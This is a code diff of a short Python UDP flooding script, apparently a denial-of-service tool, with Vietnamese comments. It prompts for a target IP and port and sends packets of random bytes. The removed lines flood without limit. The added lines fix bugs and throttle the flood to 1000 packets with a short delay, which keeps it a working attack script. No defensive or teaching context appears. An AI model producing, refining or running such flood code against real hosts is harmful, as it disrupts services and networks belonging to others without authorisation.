@@ -1,15 +1,23 @@
-import socket, random, time
+import socket
+import random
+import time
 
 s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
 ip = input("Enter Target IP: ")
-
 port = int(input("Enter Target Port: "))
 
-s.connect((ip, port))
+# Địa chỉ và cổng đích
+target_address = (ip, port)
 
-for i in range(1, 100**1000):
-  s.send(random._urandom(10)*1000)
-  print(f"Send: {i}", end='\r')
-  
-sleep(0.1)
+# Số lượng vòng lặp thực tế hơn
+num_messages = 1000
+chunk_size = 1024  # Kích thước của mỗi gói tin (1 KB)
+
+for i in range(num_messages):
+    data = random._urandom(chunk_size)
+    s.sendto(data, target_address)
+    print(f"Sent: {i + 1}", end='\r')
+    time.sleep(0.1)  # Thay vì `sleep`, sử dụng `time.sleep`
+
+s.close()
